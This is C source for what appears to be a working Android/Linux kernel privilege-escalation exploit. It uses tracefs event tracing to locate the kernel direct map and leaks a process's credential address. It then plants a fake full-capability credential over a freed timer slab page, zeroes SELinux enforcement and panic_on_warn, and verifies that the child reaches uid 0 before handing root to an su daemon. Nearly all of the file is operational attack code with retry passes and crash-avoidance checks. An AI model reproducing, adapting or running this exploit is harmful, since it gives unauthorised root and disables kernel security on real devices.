	if (g_offsets_only || STATIC_TIMER_SITE == 0 || TIMER_SITE_LOW21 == 0) {
		g_offsets_only = 1;
		g_site_soft = 1;
		fake_stage = 0;
		g_fake_stage = 0;
		logf("[cfg] ev ids: alloc=%d free=%d pageAlloc=%d pageFree=%d drain=%d\n",
	     (int)EV_CACHE_ALLOC, (int)EV_CACHE_FREE, (int)EV_PAGE_ALLOC,
	     (int)EV_PAGE_FREE, (int)EV_PCPU_DRAIN);
	logf("[cfg] mode=offsets-only (no text symbols; size-class + spray)\n");
	} else {
		g_task_obj = slabinfo_task_obj();
	logf("[slab] task_struct objsize=%#llx cfg=%#llx\n",
	     (unsigned long long)g_task_obj,
	     (unsigned long long)TASK_ALLOC_BYTES);
	logf("[cfg] mode=symbols (timer=%#llx low21=%#llx)\n",
		     (unsigned long long)STATIC_TIMER_SITE,
		     (unsigned long long)TIMER_SITE_LOW21);
	}
	if (check_only) {
		logf("[check] uid=%d euid=%d\n", (int)getuid(), (int)geteuid());
		logf("[check] tracefs=%s\n", access(TR "/trace", W_OK) ? "no" : "yes");
		logf("[check] raw-percpu=%s\n",
		     access(TR "/per_cpu/cpu0/trace_pipe_raw", R_OK) ? "no"
								    : "yes");
		logf("[check] trigger=%s\n",
		     access(TR "/events/kmem/rss_stat/trigger", W_OK) ? "no"
								     : "yes");
		pin(g_cpu);
		(void)wr(TR "/tracing_on", "0");
		(void)wr(TR "/buffer_size_kb", "4096");
		enable_events();
		ensure_raw();
		g_base = calibrate_base(g_evs);
		logf("[check] base=%#llx\n", (unsigned long long)g_base);
		logf("[check] %s\n", g_base ? "READY" : "NOT_READY");
		return g_base ? 0 : 1;
	}

	pin(g_cpu);
	logf("[+] pid=%d cpu=%d mode=%d\n", getpid(), g_cpu, shell_mode);
	logf("[+] target: EK-CORE uid-0 (timer=%#llx low21=%#llx selinux=%#llx cred_uid=%#x itimer=%#llx)\n",
	     (unsigned long long)STATIC_TIMER_SITE, (unsigned long long)TIMER_SITE_LOW21,
	     (unsigned long long)SELINUX_STATE_STATIC, (unsigned)CRED_UID_OFF, (unsigned long long)ITIMER_SIZE);
	(void)wr(TR "/tracing_on", "0");
	(void)wr(TR "/buffer_size_kb", "8192");
	enable_events();
	ensure_raw();

	g_base = calibrate_base(g_evs);
	if (!g_base) {
		logf("[-] base calibration failed\n");
		/* 0 条 kmem 记录时，几乎都是 tracefs 写不进去（SELinux 拒写），
		 * 这时任何后续步骤都只是空转，必须让上层看到确切原因。*/
		if (!g_base)
			logf("CHAIN_STOP:no_trace_records\n");
		return 1;
	}
	logf("[+] direct map base=%#llx\n", (unsigned long long)g_base);

	/* sanity：direct map base 必须 2 MiB 对齐、落在内核直映射区间。
	 * 对不上就早退——写错对象比跑不通严重得多（直接 panic）。*/
	if ((g_base & 0x1FFFFFULL) || g_base < 0xffffff8000000000ULL ||
	    g_base >= 0xffffffd000000000ULL) {
		logf("[!] base sanity failed: %#llx\n",
		     (unsigned long long)g_base);
		logf("CHAIN_STOP:base_sanity\n");
		return 1;
	}

	R = leak_cred(&C, &go_fd, &st_fd, shell_mode);
	if (!R) {
		logf("[-] cred leak failed\n");
		return 1;
	}
	logf("[+] child=%d cred=%#llx target=%#llx\n", C,
	     (unsigned long long)R, (unsigned long long)(R + CRED_UID_OFF));
	if (leak_only) {
		close(go_fd);
		close(st_fd);
		kill(C, SIGKILL);
		waitpid(C, NULL, 0);
		logf("[+] leak-only run complete\n");
		return 0;
	}
	ensure_pool();
	ensure_raw();

	if (fake_stage) {
		struct plant_res fc;

		/* YuKongA's chain, in order:
		 *   1. point task->cred at a fake full-cap cred planted over the
		 *      reclaimed timer slab page,
		 *   2. zero selinux_state.enforcing so ksud may load a module,
		 *   3. zero panic_on_warn (the self-parent erase WARNs),
		 *   4. repair the fake cred's uid/gid that step 1 dirtied.
		 */
		write_ksu_script();
		if (!g_child_task)
			park_forever("child task not leaked");
#if EXTRACTKIT_PERMISSIVE_FIRST
		/* MagicRoot 的顺序：先 PERMISSIVE（清 selinux_state.enforcing），
		 * 再动 cred。清零失败不致命，继续 cred 阶段。 */
		if (SELINUX_STATE_STATIC && g_slide &&
		    !((SELINUX_STATE_STATIC + g_slide) & 7)) {
			logf("[permissive] clear selinux_state.enforcing=%#llx\n",
			     (unsigned long long)(SELINUX_STATE_STATIC + g_slide));
			if (stage_write(SELINUX_STATE_STATIC + g_slide - 7,
					MODE_ZERO, "permissive", NULL))
				logf("[permissive] miss; continue cred stage\n");
			else
				logf("[permissive] enforcing cleared (read %d)\n",
				     read_selinux_enforce());
#if EXTRACTKIT_PERMISSIVE_ONLY
			park_forever("permissive-only 完成");
#endif
		}
#endif
		if (fake_cred_install(&fc))
			park_forever("fake cred write failed");
		if (!g_slide)
			park_forever("no KASLR slide");
		g_fake_A = fc.A;
		logf("[+] fake cred A=%#llx selinux_state=%#llx\n",
		     (unsigned long long)fc.A,
		     (unsigned long long)(SELINUX_STATE_STATIC + g_slide));
		/* BTF 已核：selinux_state.enforcing 在结构体偏移 0，结构体按 8 字节
		 * 对齐。所以「8 字节零写落在 A-7」正好只覆盖 enforcing 这个字节，
		 * 不会顺手清掉 checkreqprot / initialized / policycap（把
		 * initialized 清 0 比清错相邻变量危险得多）。A 不对齐说明符号值
		 * 或 slide 有问题，宁可不写。*/
		if (SELINUX_STATE_STATIC == 0) {
			logf("[!] no selinux_state constant; skip\n");
		} else if ((SELINUX_STATE_STATIC + g_slide) & 7) {
			logf("[!] selinux_state=%#llx unaligned; skip\n",
		     (unsigned long long)(SELINUX_STATE_STATIC + g_slide));
		} else if (g_stage_verify = verify_enforce_zero,
			   stage_write(SELINUX_STATE_STATIC + g_slide - 7,
				       MODE_ZERO, "selinux", NULL)) {
			/* 非致命：fake cred 已装好、security 指向 kernel sid，
			 * uid=0 的判定不依赖 enforcing。清零失败只意味着后面
			 * ksud 加载模块会被拒，不该因此放弃已经到手的 uid。*/
			logf("[!] selinux zero miss; continue uid check\n");
		} else {
			logf("[+] selinux enforcing cleared (read %d)\n", read_selinux_enforce());
			g_stage_verify = NULL;
		}
		/* panic_on_warn 是条件必需符号：cfg 里给 0 表示「这台内核算不出来」。
		 * sysctl 已经是 0 就整段跳过；万一 sysctl 真是 1 又没有地址，明确拒绝，
		 * 宁可停在 CHAIN_STOP 也不能赌一次 WARN 把机器打崩。 */
		if (read_panic_on_warn() != 0) {
			if (PANIC_ON_WARN_STATIC == 0 ||
			    (g_slide & 0x1fffffULL) != 0 ||
			    ((PANIC_ON_WARN_STATIC + g_slide) & 7ULL) != 0)
				park_forever("CHAIN_STOP:panic_on_warn_set");
			if (g_stage_verify = verify_panic_zero,
			    stage_write(PANIC_ON_WARN_STATIC + g_slide, MODE_ZERO,
					"panic_on_warn", NULL))
				park_forever("panic_on_warn write failed");
		}
		/* gaaa 的四趟 pass：每趟读回子进程真实 uid，不达标就整段重来
		 * （新的 UAF + 新的 fake cred），绝不对已经消耗掉的对象再 erase
		 * 一次 —— 那正是 9.105 在 6.1.157 上死机的直接原因。 */
		for (int pass = 1; pass <= 4; pass++) {
			int cu;

			if (pass > 1) {
				struct plant_res nf;

				logf("[real_cred] pass %d/4: re-planting fake cred\n",
				     pass);
				if (fake_cred_install(&nf)) {
					logf("[!] pass %d re-plant failed; keeping previous\n",
					     pass);
					break;
				}
				fc = nf;
				g_fake_A = fc.A;
			}
			/* rb_erase 唯一弄脏的是 A+0x08（__rb_change_child 写
			 * A->rb_right = task+0x820）。uid@8 时 A+8 正好是
			 * uid/gid；uid@4 时用 CRED_UID_OFF 会漏掉 suid。 */
			if (stage_write(fc.A + 0x08, MODE_ZERO, "fake_uid",
					NULL))
				logf("[!] pass %d uid repair missed\n", pass);
			cu = read_child_uid(C);
			if (cu < 0) {
				/* -1 open 失败 / -2 段数不足：观测失败既不等于成功，
				 * 也不能当成「已清 0」，按未成功继续下一趟。 */
				logf("[!] child Uid unreadable (%d); treat as failure\n", cu);
				cu = 1;
			}
			logf("[real_cred] pass %d/4 -> uid=%d r=%d\n", pass, cu,
			     cu == 0);
			if (cu == 0)
				break;
			logf("[real_cred] child r=%d still nonzero; UAF fallback\n",
			     cu);
		}
	} else {
		memset(&r, 0, sizeof(r));
		int tries = fam_is_61() ? 12 : 3;

		for (int a = 0; a < tries && !r.ok; a++) {
			logf("[cred] attempt %d/%d\n", a + 1, tries);
			run_plant(R + CRED_UID_OFF, a + 1, &r, selftest,
				  pointer_mode);
		}
		if (!r.ok)
			park_forever("no successful plant");
	}
	/* 写完之后不看「我们的日志说成功」，而是去读子进程自己的 /proc/PID/status：
	 * Uid 四段（real/effective/saved/fs）必须全 0，CapEff 必须是全量能力集。
	 * 只改到 effective 的那种半成功（id 显示 uid=0 但 fork 出去又掉回 2000）在这里现形。*/
	{
		char path[64], line[256];
		FILE *pf;
		int uid4 = 0, caps = 0, gid4 = 0;
		int ga = 0, gb = 0, gc = 0, gd = 0;

		snprintf(path, sizeof(path), "/proc/%d/status", C);
		pf = fopen(path, "r");
		logf("[verify] %s -> %s\n", path, pf ? "open" : "FAILED");
		if (pf) {
			while (fgets(line, sizeof(line), pf)) {
				if (!strncmp(line, "Uid:", 4)) {
					int a = -1, b = -1, c2 = -1, d = -1;

					logf("[verify] %s", line);
					if (sscanf(line, "Uid:\t%d\t%d\t%d\t%d",
						   &a, &b, &c2, &d) == 4 &&
					    a == 0 && b == 0 && c2 == 0 && d == 0)
						uid4 = 1;
				} else if (!strncmp(line, "Gid:", 4) &&
					   sscanf(line, "Gid:\t%d\t%d\t%d\t%d",
						  &ga, &gb, &gc, &gd) == 4) {
					gid4 = (ga == 0 && gb == 0 && gc == 0 && gd == 0);
					logf("[verify] %s", line);
				} else if (!strncmp(line, "CapEff:", 7)) {
					logf("[verify] %s", line);
					if (strstr(line, "000001ffffffffff") ||
					    strstr(line, "0000017fffffffff"))
						caps = 1;
				}
			}
			fclose(pf);
		}
		if (!uid4 || !gid4) {
			logf("[!] cred verify: uid/gid not all 0 (Uid=%d Gid=%d)\n",
			     uid4, gid4);
			park_forever("CHAIN_STOP:cred_verify");
		} else if (!caps) {
			logf("[!] cred verify: uid 0 but partial CapEff\n");
		} else {
			logf("[verify] cred ok: uid/gid all 0 + full caps\n");
		}
	}
	logf("[+] cred writes landed, waking child\n");

	if (write(go_fd, "A", 1) != 1)
		logf("[!] child wake write failed\n");
	close(go_fd);

	{
		struct child_report rep;
		struct pollfd pf = { .fd = st_fd, .events = POLLIN };
		ssize_t rn = -1;

		if (poll(&pf, 1, 10000) > 0)
			rn = read(st_fd, &rep, sizeof(rep));
		close(st_fd);
		if (rn == (ssize_t)sizeof(rep) && rep.magic == CHILD_MAGIC) {
			logf("[+] child report uid=%d euid=%d setresuid(0,0,0)=%d errno=%d resuid=%d/%d/%d\n",
			     rep.uid, rep.euid, rep.setuid_ret,
			     rep.setuid_errno, rep.ruid, rep.reuid, rep.rsuid);
			if (rep.setuid_ret != 0 || rep.reuid != 0)
				logf("[!] child did not reach euid 0\n");
		} else {
			logf("[!] child report missing (n=%zd)\n", rn);
		}
	}

	{
		int st = 0;

		if (waitpid(C, &st, 0) == C)
			logf("[+] child exit status=%#x\n", st);
	}
	/* YuKongA parks here in fake mode: the reclaimed page now backs a live
	 * task->cred, so this process must never exit and let the slab go. */
	if (fake_stage) {
		post_success_trim();
		logf("[!] fake cred page held; reboot to clean\n");
		logf("[+] done\n");
		for (;;)
			pause();
	}
	/* A held zombie from a failed plant must not be reaped by us, and must
	 * not be adopted-then-reaped by init either, so the process cannot exit
	 * while one exists. The App only needs the su daemon, which is already
	 * running, so report it and park. */
	if (g_held) {
		post_success_trim();
		logf("[!] %d failed plant(s) left held zombies; parking (reboot required)\n",
		     g_held);
		logf("[+] root handed to the temporary-su daemon\n");
		logf("[+] done\n");
		for (;;)
			pause();
	}
	logf("[+] done\n");
	return 0;
}